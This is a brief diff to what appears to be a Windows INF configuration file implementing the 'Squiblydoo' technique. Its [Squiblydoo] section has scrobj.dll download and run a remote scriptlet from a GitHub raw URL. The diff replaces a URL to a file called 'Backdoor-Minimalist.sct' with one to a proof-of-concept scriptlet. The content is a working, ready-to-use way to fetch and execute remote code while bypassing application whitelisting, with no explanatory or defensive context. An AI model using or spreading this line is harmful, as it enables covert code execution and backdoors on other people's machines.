@@ -28,4 +28,4 @@ UnregisterDlls = Squiblydoo
 UnregisterDlls = Squiblydoo
 
 [Squiblydoo]
-11,,scrobj.dll,2,60,https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/ef22366bfb62a2ddea8c5e321d3ce2f4c95d2a66/Backdoor-Minimalist.sct
+11,,scrobj.dll,2,60,https://raw.githubusercontent.com/rmsairlock/pocjunk/master/pocreg.sct
